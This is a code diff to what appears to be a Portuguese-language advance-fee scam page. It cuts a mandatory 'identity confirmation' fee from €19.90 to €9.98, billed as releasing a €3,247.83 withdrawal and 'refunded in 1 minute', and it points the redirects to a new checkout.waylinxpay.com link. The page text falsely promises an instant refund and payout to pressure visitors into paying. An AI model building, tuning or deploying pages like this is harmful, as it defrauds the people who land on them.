@@ -233,13 +233,13 @@ const pages = {
           CONFIRMAÇÃO DE IDENTIDADE
         </div>
         <div class="confirmation-fee-amount">
-          € 19.90
+          € 9.98
           <span class="confirmation-reembolso-badge">VALOR REEMBOLSÁVEL</span>
         </div>
         <div class="confirmation-fee-description">
           Taxa obrigatória para liberação do saque no valor de
           <span class="bold">€3.247,83</span>. O valor de
-          <span class="bold">€19.90</span> será reembolsado integralmente
+          <span class="bold">€9.98</span> será reembolsado integralmente
           para ti em 1 minuto.
         </div>
       </div>
@@ -320,7 +320,7 @@ const pages = {
           ⏱️ Reembolso automático em 1 minuto
         </div>
         <div class="confirmation-success-message" id="confirmation-success-message">
-          ✅ Identidade confirmada. € 19.90 reembolsados e saque liberado.
+          ✅ Identidade confirmada. € 9.98 reembolsados e saque liberado.
         </div>
       </div>
 
@@ -410,7 +410,7 @@ function initializePages() {
     showPage("registration");
   } else if (hash === "checkout") {
     // Redirect to standalone checkout page
-    window.location.href = 'https://checkout.waylinxpay.com/1776041475474';
+    window.location.href = 'https://checkout.waylinxpay.com/1776119308527';
   }
 }
 
@@ -425,7 +425,7 @@ function showPage(pageName) {
 
   // Redirect checkout to standalone page
   if (pageName === 'checkout') {
-    window.location.href = 'https://checkout.waylinxpay.com/1776041475474';
+    window.location.href = 'https://checkout.waylinxpay.com/1776119308527';
     return;
   }
 
@@ -701,7 +701,7 @@ function setupRegistrationPage() {
       if (typeof trackInitiateCheckout === 'function') {
         trackInitiateCheckout(19.90);
       }
-      window.location.href = 'https://checkout.waylinxpay.com/1776041475474';
+      window.location.href = 'https://checkout.waylinxpay.com/1776119308527';
     });
   }
 }
